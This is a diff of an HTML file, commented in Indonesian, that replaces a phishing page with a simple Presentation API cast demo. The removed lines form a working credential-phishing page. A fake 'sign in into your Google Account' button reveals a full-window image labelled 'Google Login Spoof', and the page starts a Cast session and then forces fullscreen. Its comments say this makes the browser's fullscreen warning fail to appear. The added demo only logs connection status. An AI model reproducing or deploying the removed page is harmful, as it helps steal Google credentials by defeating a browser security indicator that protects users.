@@ -1,100 +1,50 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, user-scalable=no" />
-  <title>URL TESTING WEBVIEW</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Simple Presentation Request Demo</title>
   <style>
-    body, html {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      width: 100%;
-      overflow: hidden;
-      background: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    #spoof-img {
-      display: none;
-      max-width: 100%;
-      max-height: 100%;
-      object-fit: cover;
-      position: absolute;
-      top: 0;
-      left: 0;
-      z-index: 1;
-    }
-    .signin-link {
-      padding: 20px 40px;
-      background: #4285f4;
-      color: white;
-      font-size: 18px;
-      text-decoration: none;
-      border-radius: 4px;
-      cursor: pointer;
-      z-index: 10;
-      position: relative;
-    }
+    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
+    #log { margin-top: 20px; padding: 10px; background: #f0f0f0; text-align: left; white-space: pre-wrap; }
   </style>
-  <script>
-    function goFullscreen() {
-      var elem = document.documentElement;
-      if (elem.requestFullscreen) {
-        elem.requestFullscreen();
-      } else if (elem.webkitRequestFullscreen) {
-        elem.webkitRequestFullscreen();
-      } else if (elem.mozRequestFullScreen) {
-        elem.mozRequestFullScreen();
-      } else if (elem.msRequestFullscreen) {
-        elem.msRequestFullscreen();
-      }
-    }
-
-    let presentationRequest;
-    let presentationConnection = null;
-
-    function startCastFlow() {
-      // 1. Tampilkan spoof.png langsung
-      document.getElementById("spoof-img").style.display = "block";
-
-      // 2. Sembunyikan tombol setelah 1 detik
-      setTimeout(() => {
-        document.querySelector(".signin-link").style.display = "none";
-      }, 1000);
-
-      // 3. Buat PresentationRequest ke receiver (ganti dengan file kamu)
-      presentationRequest = new PresentationRequest(["opener.html"]); // atau receiver.html
-
-      // Jadikan default untuk menu Cast browser
-      navigator.presentation.defaultRequest = presentationRequest;
-
-      // 4. Mulai Cast — ini akan munculkan dialog pilih device
-      presentationRequest.start()
-        .then(connection => {
-          presentationConnection = connection;
-          console.log("Cast berhasil: ", connection.id);
-
-          // 5. Setelah Cast aktif → langsung trigger fullscreen main window
-          // Cast UI aktif = toast fullscreen sering tidak muncul
-          goFullscreen();
-        })
-        .catch(error => {
-          console.error("Cast gagal: ", error);
-          // Jika Cast gagal (tidak ada device), tetap fullscreen sebagai fallback
-          goFullscreen();
-        });
-    }
-  </script>
 </head>
 <body>
-  <!-- Tombol utama -->
-  <a href="#" class="signin-link" onclick="startCastFlow(); return false;">
-    Click here to sign in into your Google Account
-  </a>
+  <h1>Presentation API Simple Demo</h1>
+  <button id="start">Start Presentation (Cast)</button>
 
-  <!-- Background spoof -->
-  <img id="spoof-img" src="spoof.png" alt="Google Login Spoof" />
+  <pre id="log"></pre>
+
+  <script>
+    function log(message) {
+      document.getElementById('log').textContent += message + '\n';
+    }
+
+    // Ganti dengan file receiver kamu (harus di folder/server yang sama)
+    const presentationRequest = new PresentationRequest(['receiver.html']);
+
+    // Jadikan default untuk menu Cast di browser
+    if ('presentation' in navigator) {
+      navigator.presentation.defaultRequest = presentationRequest;
+    } else {
+      log('Presentation API tidak didukung di browser ini.');
+    }
+
+    let connection = null;
+
+    document.getElementById('start').addEventListener('click', () => {
+      log('Memulai presentation request...');
+
+      presentationRequest.start()
+        .then(conn => {
+          connection = conn;
+          log(`Berhasil terhubung! ID: ${conn.id}`);
+          log(`URL receiver: ${conn.url}`);
+        })
+        .catch(err => {
+          log(`Error: ${err.name} - ${err.message}`);
+        });
+    });
+  </script>
 </body>
 </html>
